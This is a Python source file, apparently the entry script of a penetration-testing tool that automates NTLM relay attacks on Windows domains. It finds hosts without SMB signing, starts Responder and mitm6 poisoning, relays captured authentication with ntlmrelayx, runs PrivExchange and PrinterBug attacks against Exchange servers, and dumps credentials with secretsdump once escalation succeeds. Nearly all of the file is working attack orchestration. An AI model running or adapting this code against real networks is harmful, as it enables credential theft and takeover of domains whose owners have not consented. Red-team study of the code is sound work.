#!/usr/bin/env python3

import asyncio
import argparse
import sys
from src.utils import *
from src.tools import *
from src.smb import get_unsigned_hosts
from netaddr import IPNetwork, AddrFormatError

def parse_args():
    # Create the arguments
    parser = argparse.ArgumentParser()
    parser.add_argument("-l", "--hostlist", help="Host list file")
    parser.add_argument("-i", "--interface", help="Interface to use with Responder")
    parser.add_argument("-c", "--command", help="Remote command to run upon successful NTLM relay")
    parser.add_argument("-6", "--mitm6", action='store_true', help="Run mitm6 in conjunction with the relay attack")
    parser.add_argument("-d", "--domain", help="Domain for mitm6 to attack")
    parser.add_argument("-tf", "--target-file", help="Target file for ntlmrelayx to relay to")
    parser.add_argument("-u", "--user", help="Creds for PrivExchange: DOMAIN/user:password")
    parser.add_argument("-ef", "--exchange-file", help="Exchange server IP addresses file")
    parser.add_argument("-e", "--exchange-server", help="Exchange server IP addresses")
    parser.add_argument("-dc", "--domain-controller", help="Domain controller for Drop the Mic and PrivExchange attacks")
    parser.add_argument("--privexchange", action="store_true", help="Perform PrivExchange attack")
    parser.add_argument("--printerbug", action="store_true", help="Perform printerbug attack")
    parser.add_argument("--httpattack", action="store_true", help="Perform PrivExchange without authentication")
    return parser.parse_args()

def parse_hostlist(hostlist):
    """
    Parse the hostlist argument

    Mandatory arguments:
    - hostlist : file with list of IPs or CIDR notation blocks
    """
    hosts = []
    with open(hostlist, 'r') as f:
        host_lines = f.readlines()
        for line in host_lines:
            line = line.strip()
            try:
                if '/' in line:
                    hosts += [str(ip) for ip in IPNetwork(line)]
                elif '*' in line:
                    print_bad('CIDR notation only in the host list, e.g. 10.0.0.0/24')
                else:
                    hosts.append(line)
            except (OSError, AddrFormatError):
                print_bad('Error importing host list file. Are you sure you chose the right file?')

    return hosts

def parse_exchange_scan(proc):
    hosts = []
    for l in proc.stdout:
        if "is VULNERABLE" in l:
            host = l.split()[2]
            hosts.append(host)
    return hosts

def exchange_attacks(args, local_ip):
    printerbug = None
    privexchange = None
    scan = None

    # PrinterBug
    if args.printerbug:
        print_info("Testing Exchange servers for CVE-2019-1040 (PrinterBug)")
        scan = start_exchange_scan(args)
        vuln_hosts = parse_exchange_scan(scan)

        if len(vuln_hosts) > 0:
            exchange_server = vuln_hosts[0]
            printerbug = start_printerbug(args.user, exchange_server, local_ip)

            return printerbug, privexchange, scan

        else:
            print_bad("No Exchange servers found vulnerable to SpoolService bug")

    # PrivExchange
    elif args.privexchange:
        privexchange = start_privexchange(args, local_ip)

    return printerbug, privexchange, scan

async def relay_attacks(args, iface):
    mitm6 = None

    if args.hostlist:
        hostlist = args.hostlist
        hosts = parse_hostlist(hostlist)
        print_info("Checking for unsigned SMB hosts")
        unsigned_hosts = await get_unsigned_hosts(loop, hosts)

        if len(unsigned_hosts) == 0:
            print_bad('No hosts with SMB signing disabled found, NTLM relaying will fail')

        else:
            print_good('Unsigned SMB hosts:')
            for h in unsigned_hosts:
                print_good('  ' + h)

    # Start Responder
    responder = start_responder(iface)

    # Start mitm6
    if args.mitm6:
        mitm6 = start_mitm6(args)

    return responder, mitm6

def check_args(args):
    if args.privexchange or args.printerbug:
        if not args.exchange_server or not args.user or not args.domain_controller:
            print_bad("Incorrect arguments for PrivExchange or PrinterBug attack, necessary args: -e <exchange server> -u <DOM/user:password> -dc <domain controller IP/hostname>")
            sys.exit()

    elif args.httpattack:
        if not args.exchange_server:
            print_bad("Missing -e <exchange server> argument")
        sys.exit()

    elif not args.hostlist or not args.target_file:
        print_bad("Missing arguments check README.md for examples; minimum arguments are either -l <hostlist.txt> or -tf <targets_file.txt> for simple SMB relay attack")
        sys.exit()

def cleanup(procs):
    """
    Catch CTRL-C and kill procs
    """
    cwd = os.getcwd()
    slow_msg = ''

    for p in procs:
        # exchange_scanner and secretsdump are supposed to be dead after running
        # But why does ntlmrelayx exit before we call .kill() on it?
        # Something to do with the file object we open and close in stdout?
        if p:
            if p.name not in ['exchange_scanner', 'secretsdump', 'ntlmrelayx']:

                if p.name == 'mitm6':
                    slow_msg = ', this may take a minute'

                print_info(f'Killing {p.name}{slow_msg}')

                try:
                    p.kill()
                except ProcessLookupError:
                    print_info(f'{p.name} already dead may have errored on start, check autorelayx/logs/{p.name}.log files')

    try:
        os.remove(f'{cwd}/arp.cache')
    except FileNotFoundError:
        pass

    time.sleep(3)

async def main():
    check_args(args)
    procs = []
    iface, local_ip = get_iface_and_ip(args)

    if any([args.privexchange, args.printerbug]):
        printerbug, privexchange, scan = exchange_attacks(args, local_ip)
        procs.append(printerbug)
        procs.append(privexchange)
        procs.append(scan)

    elif any([args.hostlist, args.target_file, args.httpattack, args.mitm6]):
        responder, mitm6 = await relay_attacks(args, iface)
        procs.append(responder)
        procs.append(mitm6)

    # Start ntlmrelayx
    ntlmrelayx = start_ntlmrelayx(args)
    procs.insert(0, ntlmrelayx)

    # PrivExchange/PrinterBug successful, run secretsdump
    if ntlmrelayx.escalation_successful == True:
        secretsdump = start_secretsdump(args)
        procs.append(secretsdump)

    print_info('Cleaning up and closing')
    cleanup(procs)
    print_good('Done')

if __name__ == "__main__":

    if os.geteuid():
        print_bad('Run as root')
        sys.exit()

    args = parse_args()
    loop = asyncio.get_event_loop()
    loop.run_until_complete(main())
    loop.close()